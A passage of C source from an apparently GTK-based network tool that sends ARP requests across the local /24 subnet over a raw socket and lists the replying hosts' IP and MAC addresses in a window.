	l2addr.sll_ifindex = if_index;
	
	//fill the frame
	memcpy(frm->eth_s_mac, mac_loc, 6);
	memcpy(frm->eth_d_mac, "\xff\xff\xff\xff\xff\xff", 6);
	frm->eth_type = htons(ETH_P_ARP);
	
	frm->ar_hrd = htons(0x0001);
	frm->ar_pro = htons(0x0800);
	frm->ar_hln = 6;
	frm->ar_pln = 4;
	frm->ar_op = htons(ARPOP_REQUEST);
	
	memcpy(frm->arp_sha, mac_loc, 6);
	memcpy(frm->arp_spa, &ip_loc, 4);
	//...
	//inet_pton(AF_INET, nid, &ip_tag);
	
	
	// snd arp request 
	for(i=1; i<255; i++) {
		ip_tag = ((ip_loc & 0x00ffffff) + (i<<24));	
		memcpy(frm->arp_tpa, &ip_tag, 4);
	
		if(sendto(sockfd, un.buf, sizeof(struct arp_frame), 0, (struct sockaddr *)&l2addr, sizeof(l2addr)) < 0){
			perror("snd failed");
			close(sockfd);
			return NULL;
		}
	}
	
	all_snd = TRUE;

	return NULL;
}


/***************************************************************************\
 *
 * get arp response, if got, the sender is on len currently.
 *
\***************************************************************************/
void *get_arp_rep(void * arg) {
	
	GtkWidget * lst = (GtkWidget *)arg;
	int sockfd, i;
	union arp_buf_un un;
	struct arp_frame * frm = &un.arp_frm;
	struct ifreq ifreq;
	char mac_str[18], ip_str[16];
		
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		perror("socket error");
		return NULL;
	}
	
	// get response if have
	i = 0;
	while(i<32) {
		if(all_snd) {
			i++;
		}
		recvfrom(sockfd, un.buf, sizeof(struct arp_frame), 0, NULL, NULL);

		if(ARPOP_REPLY == ntohs(frm->ar_op)
			&& (0 == memcmp(mac_loc, frm->eth_d_mac, 6))
			) {
			
			ether_ntoa_r(frm->eth_s_mac, mac_str);
			inet_ntop(AF_INET, &frm->arp_spa, ip_str, sizeof(ip_str));
			add_to_list1(lst, FALSE, FALSE, ip_str, mac_str, ico_not_set, 0, 0);
			
		}
	}
	all_snd = FALSE;
	
	//printf("exit rcv\n");
	
	return NULL;
}



/***************************************************************************\
 *
 * initalization global variables
 *
\***************************************************************************/
void init_global() {
	int sockfd;
	struct ifreq ifreq;
	GError * error = NULL;
	
	if((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		perror("socket error");
		return;
	}
	
	strcpy(ifreq.ifr_name, "eth0");
	
	//get local mac addr
	if(ioctl(sockfd, SIOCGIFHWADDR, &ifreq) < 0) {
		perror("ioctl SIOCGIFHWADDR error");
		return;
	}
	memcpy(mac_loc, ifreq.ifr_hwaddr.sa_data, 6);
	//char mac_str[18];
	//ether_ntoa_r(mac_loc, mac_str);
	//printf("%s ---\n\n", mac_str);
	//get IF index
	if(ioctl(sockfd, SIOCGIFINDEX, &ifreq) < 0) {
		perror("ioctl SIOCGIFINDEX error");
		return;
	}
	if_index = ifreq.ifr_ifindex;
	
	//get local ip addr
	if(ioctl(sockfd, SIOCGIFADDR, &ifreq) < 0) {
		perror("ioctl SIOCGIFADDR error");
		return;
	}
	ip_loc = ((struct sockaddr_in *)&ifreq.ifr_addr)->sin_addr.s_addr;
	
	ico_ok = gdk_pixbuf_new_from_file("ok.png", &error);
	if (error) {
		g_warning ("Could not load icon: %s\n", error->message);
		g_error_free(error);
		error = NULL;
	}
	
	ico_bad = gdk_pixbuf_new_from_file("bad.png", &error);
	if (error) {
		g_warning ("Could not load icon: %s\n", error->message);
		g_error_free(error);
		error = NULL;
	}
	
	ico_not_set = gdk_pixbuf_new_from_file("none.png", &error);
	if (error) {
		g_warning ("Could not load icon: %s\n", error->message);
		g_error_free(error);
		error = NULL;
	}
	
	memset(icmp_buf, 0, 80);
}



/***************************************************************************\
 *
 * window onload handler
 *
\***************************************************************************/
void * show_hosts(void *l) {

	GtkWidget *lst = (GtkWidget *)l;
	int i;
	
	init_list1(lst);
	init_global();
	
	pthread_t t_snd_id, t_rcv_id;
	pthread_create(&t_rcv_id, NULL, get_arp_rep, lst);
	pthread_create(&t_snd_id, NULL, snd_arp_req, lst);
	
	
	pthread_join(t_snd_id, NULL);
	pthread_join(t_rcv_id, NULL);
	
	
#ifdef DBG1_ON
DBG1("show_hosts > e\n");
#endif 

	return NULL;
}








